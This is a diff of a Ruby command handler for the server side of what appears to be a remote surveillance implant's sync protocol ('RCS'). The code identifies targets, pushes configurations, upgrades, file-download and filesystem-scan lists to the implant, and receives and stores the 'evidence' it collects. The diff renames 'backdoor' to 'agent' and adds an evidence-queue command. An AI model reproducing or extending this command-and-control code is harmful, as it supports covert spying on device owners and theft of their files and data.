@@ -6,11 +6,11 @@
 require_relative 'db.rb'
 require_relative 'sessions.rb'
 require_relative 'evidence_transfer.rb'
+require_relative 'evidence_manager.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
 require 'rcs-common/pascalize'
-require 'rcs-common/evidence_manager'
 
 # system
 
@@ -21,18 +21,19 @@ module Commands
 
   # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest
 
-  INVALID_COMMAND  = 0x00       # Don't use
-  PROTO_OK         = 0x01       # OK
-  PROTO_NO         = 0x02       # Nothing available
-  PROTO_BYE        = 0x03       # The end of the protocol
-  PROTO_ID         = 0x0f       # Identification of the target
-  PROTO_CONF       = 0x07       # New configuration
-  PROTO_UNINSTALL  = 0x0a       # Uninstall command
-  PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
-  PROTO_UPLOAD     = 0x0d       # A file to be saved
-  PROTO_UPGRADE    = 0x16       # Upgrade for the backdoor
-  PROTO_EVIDENCE   = 0x09       # Upload of an evidence
-  PROTO_FILESYSTEM = 0x19       # List of paths to be scanned
+  INVALID_COMMAND     = 0x00       # Don't use
+  PROTO_OK            = 0x01       # OK
+  PROTO_NO            = 0x02       # Nothing available
+  PROTO_BYE           = 0x03       # The end of the protocol
+  PROTO_ID            = 0x0f       # Identification of the target
+  PROTO_CONF          = 0x07       # New configuration
+  PROTO_UNINSTALL     = 0x0a       # Uninstall command
+  PROTO_DOWNLOAD      = 0x0c       # List of files to be downloaded
+  PROTO_UPLOAD        = 0x0d       # A file to be saved
+  PROTO_UPGRADE       = 0x16       # Upgrade for the agent
+  PROTO_EVIDENCE      = 0x09       # Upload of an evidence
+  PROTO_EVIDENCE_SIZE = 0x0b       # Queue for evidence
+  PROTO_FILESYSTEM    = 0x19       # List of paths to be scanned
 
   LOOKUP = { PROTO_ID => :command_id,
              PROTO_CONF => :command_conf,
@@ -41,6 +42,7 @@ module Commands
              PROTO_FILESYSTEM => :command_filesystem,
              PROTO_UPGRADE => :command_upgrade,
              PROTO_EVIDENCE => :command_evidence,
+             PROTO_EVIDENCE_SIZE => :command_evidence_size,
              PROTO_BYE => :command_bye}
 
   # Protocol Identification
@@ -48,7 +50,7 @@ module Commands
   # <- PROTO_OK, Time, Availables
   def command_id(peer, session, message)
 
-    # backdoor version
+    # agent version
     version = message.slice!(0..3).unpack('I').first
 
     # ident of the target
@@ -60,41 +62,42 @@ module Commands
     trace :info, "[#{peer}][#{session[:cookie]}] Identification: #{version} '#{user_id}' '#{device_id}' '#{source_id}'"
 
     # get the time in UTC
-    now = Time.now - Time.now.utc_offset
-
+    now = Time.now.getutc.to_i
+    
     # notify the database that the sync is in progress
-    DB.sync_start session, version, user_id, device_id, source_id, now
-
+    # last parameter is true to trigger the alerts
+    DB.instance.sync_start session, version, user_id, device_id, source_id, now
+    
     # notify the Evidence Manager that the sync is in progress
-    EvidenceManager.sync_start session, version, user_id, device_id, source_id, now
+    EvidenceManager.instance.sync_start session, version, user_id, device_id, source_id, now
 
     # response to the request
     command = [PROTO_OK].pack('I')
 
     # the time of the server to synchronize the clocks
-    time = [Time.now.to_i].pack('Q')
-
+    time = [now].pack('Q')
+    
     available = ""
-    # ask to the db if there are any availables for the backdoor
+    # ask to the db if there are any availables for the agent
     # the results are actually downloaded and saved locally
-    # we will retrieve the content when the backdoor ask for them later
-    if DB.new_conf? session[:bid] then
+    # we will retrieve the content when the agent ask for them later
+    if DB.instance.new_conf? session[:bid] then
       available += [PROTO_CONF].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New config"
     end
-    if DB.new_upgrade? session[:bid]
-      available += [PROTO_UPGRADE].pack('I')
-      trace :info, "[#{peer}][#{session[:cookie]}] Available: New upgrade"
-    end
-    if DB.new_downloads? session[:bid] then
-      available += [PROTO_DOWNLOAD].pack('I')
-      trace :info, "[#{peer}][#{session[:cookie]}] Available: New downloads"
-    end
-    if DB.new_uploads? session[:bid] then
+    if DB.instance.new_uploads? session[:bid] then
       available += [PROTO_UPLOAD].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New uploads"
     end
-    if DB.new_filesystems? session[:bid]
+    if DB.instance.new_upgrade? session[:bid]
+      available += [PROTO_UPGRADE].pack('I')
+      trace :info, "[#{peer}][#{session[:cookie]}] Available: New upgrade"
+    end
+    if DB.instance.new_downloads? session[:bid] then
+      available += [PROTO_DOWNLOAD].pack('I')
+      trace :info, "[#{peer}][#{session[:cookie]}] Available: New downloads"
+    end
+    if DB.instance.new_filesystems? session[:bid]
       available += [PROTO_FILESYSTEM].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New filesystems"
     end
@@ -114,13 +117,13 @@ module Commands
   def command_bye(peer, session, message)
 
     # notify the database that the sync is ended
-    DB.sync_end session
+    DB.instance.sync_end session
     
     # notify the Evidence Manager that the sync has ended
-    EvidenceManager.sync_end session
+    EvidenceManager.instance.sync_end session
 
     # destroy the current session
-    SessionManager.delete(session[:cookie])
+    SessionManager.instance.delete(session[:cookie])
 
     trace :info, "[#{peer}][#{session[:cookie]}] Synchronization completed"
 
@@ -130,12 +133,27 @@ module Commands
   # Protocol Conf
   # -> PROTO_CONF
   # <- PROTO_NO | PROTO_OK [ Conf ]
+  # -> PROTO_CONF [ status ]
+  # <- PROTO_NO | PROTO_OK [ Conf ]
   def command_conf(peer, session, message)
     trace :info, "[#{peer}][#{session[:cookie]}] Configuration request"
 
+    # if the command contains a message
+    # it is a response to inform us of the stressfulness of the operation
+    if message.size > 0
+      status = message.slice!(0..3).unpack('I').first
+      if status == PROTO_OK
+        trace :info, "[#{peer}][#{session[:cookie]}] Configuration activated by the agent"
+        DB.instance.activate_conf session[:bid]
+      else
+        trace :warn, "[#{peer}][#{session[:cookie]}] Agent not able to use the configuration"
+      end
+      return [PROTO_OK].pack('I')
+    end
+
     # the conf was already retrieved (if any) during the ident phase
-    # here we get just the content (locally) without asking again to the db
-    conf = DB.new_conf session[:bid]
+    # here we just get the content (locally) without asking again to the db
+    conf = DB.instance.new_conf session[:bid]
 
     # send the response
     if conf.nil? then
@@ -143,7 +161,7 @@ module Commands
       response = [PROTO_NO].pack('I')
     else
       trace :info, "[#{peer}][#{session[:cookie]}] New configuration (#{conf.length} bytes)"
-      response = [PROTO_OK].pack('I') + [conf.length].pack('I') + conf
+      response = [PROTO_OK].pack('I') + [conf.bytesize].pack('I') + conf
     end
 
     return response
@@ -158,8 +176,8 @@ module Commands
     # the upload list was already retrieved (if any) during the ident phase
     # here we get just the content (locally) without asking again to the db
     # the database will output one upload at a time and the 'left' number of file
-    # we pass it to the backdoor which will request again if left is greater than zero
-    upload, left = DB.new_uploads session[:bid]
+    # we pass it to the agent which will request again if left is greater than zero
+    upload, left = DB.instance.new_uploads session[:bid]
 
     # send the response
     if upload.nil? then
@@ -188,7 +206,7 @@ module Commands
     trace :info, "[#{peer}][#{session[:cookie]}] Upgrade request"
 
     # the upgrade list was already retrieved (if any) during the ident phase (like upload)
-    upgrade, left = DB.new_upgrade session[:bid]
+    upgrade, left = DB.instance.new_upgrade session[:bid]
 
     # send the response
     if upgrade.nil? then
@@ -218,7 +236,7 @@ module Commands
 
     # the download list was already retrieved (if any) during the ident phase
     # here we get just the content (locally) without asking again to the db
-    downloads = DB.new_downloads session[:bid]
+    downloads = DB.instance.new_downloads session[:bid]
 
     # send the response
     if downloads.empty? then
@@ -247,7 +265,7 @@ module Commands
 
     # the filesystem list was already retrieved (if any) during the ident phase
     # here we get just the content (locally) without asking again to the db
-    filesystems = DB.new_filesystems session[:bid]
+    filesystems = DB.instance.new_filesystems session[:bid]
 
     # send the response
     if filesystems.empty? then
@@ -279,19 +297,37 @@ module Commands
     # send the evidence to the db
     begin
       # store the evidence in the db
-      id = EvidenceManager.store_evidence session, size, message
+      EvidenceManager.instance.store_evidence session, size, message
 
       # remember how many evidence were transferred in this session
       session[:count] += 1
 
-      # notify the transfer manager that an evidence is available
-      EvidenceTransfer.queue session[:instance], id
-
-      trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes) - #{session[:count]}"
+      total = session[:total] > 0 ? session[:total] : 'unknown'
+      trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes) - #{session[:count]} of #{total}"
     rescue Exception => e
       trace :warn, "[#{peer}][#{session[:cookie]}] Evidence NOT saved: #{e.message}"
       return [PROTO_NO].pack('I')
     end
+
+    return [PROTO_OK].pack('I') + [0].pack('I')
+  end
+
+  # Protocol Evidence Size
+  # -> PROTO_EVIDENCE_SIZE [ num, size]
+  # <- PROTO_OK
+  def command_evidence_size(peer, session, message)
+
+    # get the number of files
+    num = message.slice!(0..3).unpack('I').first
+
+    # remember how many evidence will be transferred
+    session[:count] = 0
+    session[:total] = num
+
+    # get the size of evidence
+    size = message.unpack('Q').first
+
+    trace :info, "[#{peer}][#{session[:cookie]}] Evidence queue size: #{num} (#{size.to_s_bytes})"
 
     return [PROTO_OK].pack('I') + [0].pack('I')
   end
